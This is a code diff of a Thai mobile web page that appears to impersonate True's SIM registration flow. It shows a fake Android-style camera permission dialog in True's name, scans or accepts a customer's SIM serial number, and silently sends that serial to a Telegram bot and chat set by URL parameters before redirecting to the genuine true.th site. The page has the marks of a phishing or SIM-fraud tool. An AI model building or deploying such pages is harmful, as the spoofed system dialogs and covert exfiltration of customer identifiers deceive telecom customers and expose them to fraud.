@@ -5,12 +5,11 @@
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sarabun',sans-serif;-webkit-tap-highlight-color:transparent}
-
 .app{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;flex-direction:column;background:#fff}
 
 /* Header */
 .hdr{display:flex;align-items:center;background:#fff;border-bottom:1px solid #e8e8e8;flex-shrink:0;padding-top:env(safe-area-inset-top,0px)}
-.hdr-inner{display:flex;align-items:center;width:100%;height:52px;padding:0 4px}
+.hdr-inner{display:flex;align-items:center;width:100%;height:56px;padding:0 4px}
 .hdr-back{width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#e8001c;flex-shrink:0}
 .hdr-title{flex:1;text-align:center;font-size:22px;font-weight:700;color:#1a1a1a;margin-right:44px}
 
@@ -24,143 +23,114 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
 .pane{position:absolute;top:0;left:0;right:0;bottom:0;display:none}
 .pane.active{display:flex;flex-direction:column}
 
-/* ── SCAN PANE ── */
+/* SCAN PANE */
 .scan-pane{background:#3d3d3d;overflow:hidden}
-
-#video{
-  position:absolute;top:0;left:0;width:100%;height:100%;
-  object-fit:cover;z-index:1;display:block
-}
-
+#video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;display:block}
 .cam-label{
-  position:absolute;left:0;right:0;
-  top:33%;
-  text-align:center;
-  font-size:24px;font-weight:700;color:#fff;
-  z-index:3;pointer-events:none;
-  text-shadow:0 1px 6px rgba(0,0,0,0.6)
+  position:absolute;left:0;right:0;top:30%;
+  text-align:center;font-size:24px;font-weight:700;color:#fff;
+  z-index:3;pointer-events:none;text-shadow:0 1px 6px rgba(0,0,0,0.6)
 }
-
 .scan-overlay{
-  position:absolute;inset:0;
-  display:flex;align-items:center;justify-content:center;
-  padding-top:40px;
-  z-index:3;pointer-events:none
+  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  padding-top:40px;z-index:3;pointer-events:none
 }
-.scan-frame{
-  position:relative;
-  width:88%;
-  aspect-ratio:3/1;
-  background:rgba(160,140,120,0.20);
-  border-radius:14px
+.scan-frame{position:relative;width:88%;aspect-ratio:3/1;background:rgba(160,140,120,0.20);border-radius:14px}
+.scan-frame::before,.scan-frame::after,.scan-frame>span::before,.scan-frame>span::after{
+  content:'';position:absolute;width:34px;height:34px;border-color:rgba(220,220,220,0.95);border-style:solid
 }
-.scan-frame::before,.scan-frame::after,
-.scan-frame>span::before,.scan-frame>span::after{
-  content:'';position:absolute;
-  width:34px;height:34px;
-  border-color:rgba(220,220,220,0.95);border-style:solid
-}
-.scan-frame::before {top:-2px;left:-2px;  border-width:3px 0 0 3px;border-radius:10px 0 0 0}
-.scan-frame::after  {top:-2px;right:-2px; border-width:3px 3px 0 0;border-radius:0 10px 0 0}
-.scan-frame>span::before{bottom:-2px;left:-2px; border-width:0 0 3px 3px;border-radius:0 0 0 10px}
-.scan-frame>span::after {bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 10px 0}
+.scan-frame::before{top:-2px;left:-2px;border-width:3px 0 0 3px;border-radius:10px 0 0 0}
+.scan-frame::after{top:-2px;right:-2px;border-width:3px 3px 0 0;border-radius:0 10px 0 0}
+.scan-frame>span::before{bottom:-2px;left:-2px;border-width:0 0 3px 3px;border-radius:0 0 0 10px}
+.scan-frame>span::after{bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 10px 0}
 
-/* idle */
+/* IDLE — พื้นหลังมืด แสดงข้อความ ไม่มีปุ่ม */
 .cam-idle{
-  position:absolute;inset:0;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
-  background:#3d3d3d;cursor:pointer;z-index:5
+  position:absolute;inset:0;z-index:10;
+  background:#3d3d3d;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px
 }
 .cam-idle-icon{
-  width:72px;height:72px;
-  border:2px solid rgba(255,255,255,0.35);border-radius:18px;
+  width:88px;height:88px;
+  border:2px solid rgba(255,255,255,0.25);border-radius:24px;
   display:flex;align-items:center;justify-content:center
 }
-.cam-idle-msg{font-size:22px;font-weight:700;color:rgba(255,255,255,0.85);text-align:center}
-.cam-idle-sub{font-size:17px;color:rgba(255,255,255,0.5);text-align:center;margin-top:-4px}
+.cam-idle-title{font-size:22px;font-weight:800;color:#fff;text-align:center}
+.cam-idle-sub{font-size:17px;color:rgba(255,255,255,0.55);text-align:center;margin-top:-10px;padding:0 32px;line-height:1.6}
+
+/* POPUP — Android dialog style */
+.popup-overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,0.55);
+  display:flex;align-items:center;justify-content:center;
+  z-index:100;padding:28px;
+  opacity:0;pointer-events:none;
+  transition:opacity .18s
+}
+.popup-overlay.show{opacity:1;pointer-events:auto}
+.popup-box{
+  width:100%;max-width:340px;
+  background:#fff;border-radius:28px;
+  padding:28px 0 0;
+  transform:scale(0.93);
+  transition:transform .2s cubic-bezier(.34,1.56,.64,1)
+}
+.popup-overlay.show .popup-box{transform:scale(1)}
+
+.popup-icon{
+  width:52px;height:52px;
+  background:#e8f0fe;border-radius:14px;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 16px
+}
+.popup-desc{
+  font-size:20px;color:#444;text-align:center;
+  line-height:1.6;padding:0 24px;margin-bottom:8px
+}
+.popup-desc strong{color:#111;font-weight:800}
+.popup-divider{height:1px;background:#e8e8e8;margin:8px 0 0}
+
+/* ปุ่มใน popup — onclick ตรงไปที่ startCamera() ทันที ไม่มีฟังก์ชันกลาง */
+.popup-btn{
+  width:100%;padding:20px 24px;
+  background:none;border:none;border-bottom:1px solid #e8e8e8;
+  font-family:'Sarabun',sans-serif;
+  font-size:22px;font-weight:700;color:#1a73e8;
+  cursor:pointer;text-align:center;display:block;
+  -webkit-appearance:none
+}
+.popup-btn:active{background:#f0f4ff}
+.popup-btn.deny{color:#666;font-weight:600;border-bottom:none;padding-bottom:24px;font-size:21px}
 
 /* toast */
 .toast{
   position:fixed;bottom:calc(24px + env(safe-area-inset-bottom,0px));
   left:50%;transform:translateX(-50%);
   background:rgba(20,20,20,0.9);color:#fff;
-  padding:10px 22px;border-radius:24px;
-  font-size:14px;font-weight:600;white-space:nowrap;
-  z-index:99;opacity:0;pointer-events:none;transition:opacity .2s
+  padding:12px 24px;border-radius:24px;
+  font-size:16px;font-weight:600;white-space:nowrap;
+  z-index:200;opacity:0;pointer-events:none;transition:opacity .2s
 }
 .toast.show{opacity:1}
 
-/* ── CAMERA PERMISSION POPUP (Android system dialog style) ── */
-.cam-popup-overlay{
-  position:fixed;inset:0;
-  background:rgba(0,0,0,0.55);
-  display:flex;align-items:center;justify-content:center;
-  z-index:50;padding:24px;
-  opacity:0;pointer-events:none;
-  transition:opacity .2s
-}
-.cam-popup-overlay.show{opacity:1;pointer-events:auto}
-
-.cam-popup{
-  width:100%;max-width:340px;
-  background:#fff;
-  border-radius:28px;
-  padding:28px 0 8px;
-  transform:scale(0.92);
-  transition:transform .2s cubic-bezier(.34,1.56,.64,1)
-}
-.cam-popup-overlay.show .cam-popup{transform:scale(1)}
-
-.cam-popup-icon{
-  width:48px;height:48px;
-  background:#e8f0fe;border-radius:12px;
-  display:flex;align-items:center;justify-content:center;
-  margin:0 auto 14px
-}
-
-.cam-popup-desc{
-  font-size:20px;color:#444;text-align:center;
-  line-height:1.6;margin-bottom:6px;
-  padding:0 20px
-}
-.cam-popup-desc strong{color:#111;font-weight:800}
-
-.cam-popup-divider{
-  height:1px;background:#e8e8e8;margin:8px 0 0
-}
-
-.cam-popup-btn{
-  width:100%;padding:20px 24px;
-  background:none;border:none;border-bottom:1px solid #e8e8e8;
-  font-family:'Sarabun',sans-serif;
-  font-size:22px;font-weight:700;color:#1a73e8;
-  cursor:pointer;text-align:center;display:block
-}
-.cam-popup-btn:active{background:#f5f5f5}
-.cam-popup-btn.once{color:#1a73e8}
-.cam-popup-btn.deny{color:#444;font-weight:600;border-bottom:none;padding-bottom:24px}
-
-/* ── MANUAL PANE ── */
+/* MANUAL PANE */
 .manual-pane{background:#fff;overflow-y:auto;-webkit-overflow-scrolling:touch}
-.manual-inner{
-  min-height:100%;display:flex;flex-direction:column;
-  padding:28px 20px calc(32px + env(safe-area-inset-bottom,0px));gap:20px
-}
-.field-lbl{font-size:14px;font-weight:700;color:#888;margin-bottom:8px}
+.manual-inner{min-height:100%;display:flex;flex-direction:column;padding:28px 20px calc(32px + env(safe-area-inset-bottom,0px));gap:20px}
+.field-lbl{font-size:16px;font-weight:700;color:#888;margin-bottom:8px}
 .serial-input{
   width:100%;border:1.5px solid #e8e8e8;border-radius:10px;
   padding:15px 16px;font-family:'Sarabun',monospace;
-  font-size:20px;font-weight:700;color:#1a1a1a;
+  font-size:22px;font-weight:700;color:#1a1a1a;
   outline:none;letter-spacing:.05em;-webkit-appearance:none;background:#fff;
   transition:border-color .18s
 }
 .serial-input:focus{border-color:#e8001c}
-.serial-input::placeholder{color:#bbb;font-weight:400;font-size:15px;letter-spacing:0}
-.field-hint{font-size:13px;color:#999;line-height:1.6}
+.serial-input::placeholder{color:#bbb;font-weight:400;font-size:16px;letter-spacing:0}
+.field-hint{font-size:15px;color:#999;line-height:1.6}
 .spacer{flex:1}
 .btn-submit{
-  width:100%;padding:17px;background:#e8001c;border:none;border-radius:12px;
-  font-family:'Sarabun',sans-serif;font-size:17px;font-weight:800;
+  width:100%;padding:18px;background:#e8001c;border:none;border-radius:12px;
+  font-family:'Sarabun',sans-serif;font-size:20px;font-weight:800;
   color:#fff;cursor:pointer;-webkit-appearance:none
 }
 .btn-submit:active{opacity:.85}
@@ -183,29 +153,22 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   </div>
 
   <div class="content">
-    <!-- SCAN PANE -->
     <div class="pane active scan-pane" id="paneScan">
       <video id="video" playsinline muted autoplay></video>
-
       <div class="cam-label">สแกนบาร์โค้ดบนซองซิมการ์ด</div>
-
-      <div class="scan-overlay">
-        <div class="scan-frame"><span></span></div>
-      </div>
-
-      <div class="cam-idle" id="camIdle" onclick="startCameraFromIdle()">
+      <div class="scan-overlay"><div class="scan-frame"><span></span></div></div>
+      <div class="cam-idle" id="camIdle">
         <div class="cam-idle-icon">
-          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round">
+          <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="1.6" stroke-linecap="round">
             <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
             <circle cx="12" cy="13" r="4"/>
           </svg>
         </div>
-        <div class="cam-idle-msg" id="camIdleMsg">กำลังเปิดกล้อง...</div>
-        <div class="cam-idle-sub">แตะที่นี่หากกล้องไม่เปิด</div>
+        <div class="cam-idle-title" id="camIdleMsg">กรุณาอนุญาตการใช้กล้อง</div>
+        <div class="cam-idle-sub">กดปุ่มอนุญาตเพื่อเปิดกล้องสแกนบาร์โค้ด</div>
       </div>
     </div>
 
-    <!-- MANUAL PANE -->
     <div class="pane manual-pane" id="paneManual">
       <div class="manual-inner">
         <div>
@@ -222,33 +185,29 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   </div>
 </div>
 
-<!-- CAMERA PERMISSION POPUP (Android system dialog style) -->
-<div class="cam-popup-overlay" id="camPopupOverlay">
-  <div class="cam-popup">
-    <div class="cam-popup-icon">
-      <!-- camera icon ฟ้า เหมือน Android -->
+<!-- POPUP — ปุ่มทุกปุ่มเรียก startCamera() โดยตรง = user gesture จริง -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-box">
+    <div class="popup-icon">
       <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
         <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
         <circle cx="12" cy="13" r="4"/>
       </svg>
     </div>
-
-    <div class="cam-popup-desc">
+    <div class="popup-desc">
       อนุญาตให้ <strong>True</strong> ถ่ายรูปและบันทึกวิดีโอไหม
     </div>
-
-    <div class="cam-popup-divider"></div>
-
-    <button class="cam-popup-btn" id="btnAllow1" onclick="openCameraFromPopup()">ขณะใช้แอป</button>
-    <button class="cam-popup-btn once" id="btnAllow2" onclick="openCameraFromPopup()">เฉพาะครั้งนี้</button>
-    <button class="cam-popup-btn deny" onclick="closePopupAndManual()">ไม่อนุญาต</button>
+    <div class="popup-divider"></div>
+    <!-- กดปุ่มนี้ → startCamera() ทันที ใน gesture เดียวกัน → getUserMedia สำเร็จ -->
+    <button class="popup-btn" onclick="startCamera()">ขณะใช้แอป</button>
+    <button class="popup-btn" onclick="startCamera()">เฉพาะครั้งนี้</button>
+    <button class="popup-btn deny" onclick="denyCamera()">ไม่อนุญาต</button>
   </div>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-// Telegram config from URL params
 const LS  = k   => { try{return localStorage.getItem(k)||''}catch(e){return''} };
 const LSS = (k,v) => { try{localStorage.setItem(k,v)}catch(e){} };
 const p = new URLSearchParams(location.search);
@@ -257,17 +216,15 @@ if(p.get('chat')) LSS('sim_chat', p.get('chat'));
 const tgBot  = LS('sim_bot');
 const tgChat = LS('sim_chat');
 
-// Tab switch
 function switchTab(tab) {
   document.getElementById('paneScan').classList.toggle('active', tab==='scan');
   document.getElementById('paneManual').classList.toggle('active', tab==='manual');
   document.getElementById('tabScan').classList.toggle('active', tab==='scan');
   document.getElementById('tabManual').classList.toggle('active', tab==='manual');
-  if(tab==='scan' && !scanning) showCameraPopup();
+  if(tab==='scan' && !scanning) showPopup();
   if(tab==='manual') stopCamera();
 }
 
-// Toast
 let toastT;
 function toast(msg) {
   const el=document.getElementById('toast');
@@ -276,102 +233,93 @@ function toast(msg) {
   toastT=setTimeout(()=>el.classList.remove('show'),2500);
 }
 
-// Popup
-function showCameraPopup() {
-  const overlay = document.getElementById('camPopupOverlay');
-  overlay.classList.add('show');
+function showPopup() {
+  document.getElementById('popupOverlay').classList.add('show');
 }
-
 function hidePopup() {
-  document.getElementById('camPopupOverlay').classList.remove('show');
+  document.getElementById('popupOverlay').classList.remove('show');
 }
-
-function openCameraFromPopup() {
-  hidePopup();
-  // ต้องเรียก getUserMedia ใน user gesture เดียวกันทันที ห้าม delay/setTimeout
-  startCamera();
-}
-
-function closePopupAndManual() {
+function denyCamera() {
   hidePopup();
   switchTab('manual');
 }
 
-// Tap idle (กล้องไม่เปิด → แตะ)
-function startCameraFromIdle() {
-  startCamera();
-}
-
-// Camera
 let reader=null, scanning=false, stream=null;
 
+// startCamera() ถูกเรียกจาก onclick ของปุ่มใน popup โดยตรง
+// = user gesture chain ไม่ขาด = getUserMedia ได้รับอนุญาต
 async function startCamera() {
+  hidePopup();
   if(scanning) return;
-  const idle=document.getElementById('camIdle');
-  idle.hidden=true;
+
+  const idle = document.getElementById('camIdle');
+  const msg  = document.getElementById('camIdleMsg');
+  idle.hidden = false;
+  msg.textContent = 'กำลังเปิดกล้อง...';
 
   try {
-    // ขอสิทธิ์กล้องจากเบราว์เซอร์ทันที (ต้องอยู่ใน user gesture)
-    try {
-      stream=await navigator.mediaDevices.getUserMedia({
-        video:{facingMode:{ideal:'environment'},width:{ideal:1920},height:{ideal:1080}}
+    // getUserMedia เป็น call แรก ใน gesture stack เดียวกับที่ลูกค้ากดปุ่ม
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode:{ideal:'environment'}, width:{ideal:1920}, height:{ideal:1080} }
+    }).catch(() =>
+      navigator.mediaDevices.getUserMedia({ video:{facingMode:'environment'} })
+    );
+
+    idle.hidden = true;
+
+    const vid = document.getElementById('video');
+    vid.srcObject = stream;
+    vid.play().catch(()=>{});
+
+    if(typeof ZXing === 'undefined') {
+      await new Promise(res => {
+        const t = setInterval(()=>{ if(typeof ZXing!=='undefined'){clearInterval(t);res();} }, 100);
       });
-    } catch(e1) {
-      // fallback ลดความต้องการ
-      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
     }
 
-    // เริ่มวิดีโอก่อน
-    const vid=document.getElementById('video');
-    vid.srcObject=stream;
-    await vid.play().catch(()=>{});
-
-    // โหลด ZXing ถ้ายังไม่พร้อม
-    if(typeof ZXing==='undefined') {
-      await new Promise(res=>{ const t=setInterval(()=>{ if(typeof ZXing!=='undefined'){clearInterval(t);res();} },100); });
-    }
-
-    const hints=new Map();
+    const hints = new Map();
     hints.set(ZXing.DecodeHintType.POSSIBLE_FORMATS,[
       ZXing.BarcodeFormat.CODE_128,
       ZXing.BarcodeFormat.CODE_39,
       ZXing.BarcodeFormat.EAN_13,
     ]);
-    hints.set(ZXing.DecodeHintType.TRY_HARDER,true);
-    reader=new ZXing.BrowserMultiFormatReader(hints,{delayBetweenScanAttempts:80});
+    hints.set(ZXing.DecodeHintType.TRY_HARDER, true);
+    reader = new ZXing.BrowserMultiFormatReader(hints, {delayBetweenScanAttempts:80});
 
-    scanning=true;
-    reader.decodeFromVideoElement('video',(result)=>{
+    scanning = true;
+    reader.decodeFromVideoElement('video', result => {
       if(result){
-        const serial=extractSerial(result.getText());
+        const serial = extractSerial(result.getText());
         if(serial){ stopCamera(); onSerial(serial); }
       }
     });
 
   } catch(e) {
-    idle.hidden=false;
-    const msg=document.getElementById('camIdleMsg');
-    if(e.name==='NotAllowedError'){
-      msg.textContent='กรุณาอนุญาตใช้กล้อง';
+    idle.hidden = false;
+    if(e && e.name === 'NotAllowedError') {
+      msg.textContent = 'ไม่ได้รับสิทธิ์กล้อง';
+      // แสดง popup ใหม่ให้กดอีกครั้ง
+      setTimeout(showPopup, 500);
     } else {
-      msg.textContent='แตะเพื่อลองใหม่';
+      msg.textContent = 'เกิดข้อผิดพลาด กรุณาลองใหม่';
+      setTimeout(showPopup, 1000);
     }
-    scanning=false;
+    scanning = false;
   }
 }
 
 function stopCamera() {
   if(reader){try{reader.reset()}catch(e){} reader=null;}
   if(stream){stream.getTracks().forEach(t=>t.stop()); stream=null;}
-  scanning=false;
+  scanning = false;
 }
 
 function extractSerial(raw) {
-  const s=raw.replace(/\s/g,'');
-  const m=s.match(/8966\d{14}/);
+  const s = raw.replace(/\s/g,'');
+  const m = s.match(/8966\d{14}/);
   if(m) return m[0];
-  const m2=s.match(/\d{18}/);
-  return m2?m2[0]:null;
+  const m2 = s.match(/\d{18}/);
+  return m2 ? m2[0] : null;
 }
 
 async function onSerial(serial) {
@@ -381,30 +329,28 @@ async function onSerial(serial) {
 
 async function sendTelegram(serial) {
   if(!tgBot||!tgChat) return;
-  const now=new Date().toLocaleString('th-TH',{timeZone:'Asia/Bangkok',hour12:false});
-  const msg=`📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}`;
+  const now = new Date().toLocaleString('th-TH',{timeZone:'Asia/Bangkok',hour12:false});
+  const msg = `📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}`;
   try {
     await fetch(`https://api.telegram.org/bot${tgBot}/sendMessage`,{
-      method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:tgChat,text:msg})
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id:tgChat, text:msg})
     });
   } catch(e){}
 }
 
 function redirectToTrue(serial) {
-  window.location.href=`https://www.true.th/service/trueservice/registersim/?serial=${encodeURIComponent(serial)}`;
+  window.location.href = `https://www.true.th/service/trueservice/registersim/?serial=${encodeURIComponent(serial)}`;
 }
 
 function submitManual() {
-  const serial=document.getElementById('manualSerial').value.replace(/\D/g,'');
-  if(serial.length<10){toast('กรุณากรอกเลขซีเรียลให้ครบ');return;}
-  document.getElementById('btnSubmit').disabled=true;
+  const serial = document.getElementById('manualSerial').value.replace(/\D/g,'');
+  if(serial.length < 10){ toast('กรุณากรอกเลขซีเรียลให้ครบ'); return; }
+  document.getElementById('btnSubmit').disabled = true;
   sendTelegram(serial);
-  setTimeout(()=>redirectToTrue(serial),300);
+  setTimeout(()=>redirectToTrue(serial), 300);
 }
 
-// Auto-start — แสดง popup ก่อน แล้วค่อยเปิดกล้องเมื่อกดปุ่ม
-window.addEventListener('load',()=>{
-  setTimeout(showCameraPopup, 600);
-});
+// แสดง popup ทันทีเมื่อโหลดหน้า
+window.addEventListener('load', () => setTimeout(showPopup, 400));
 </script>
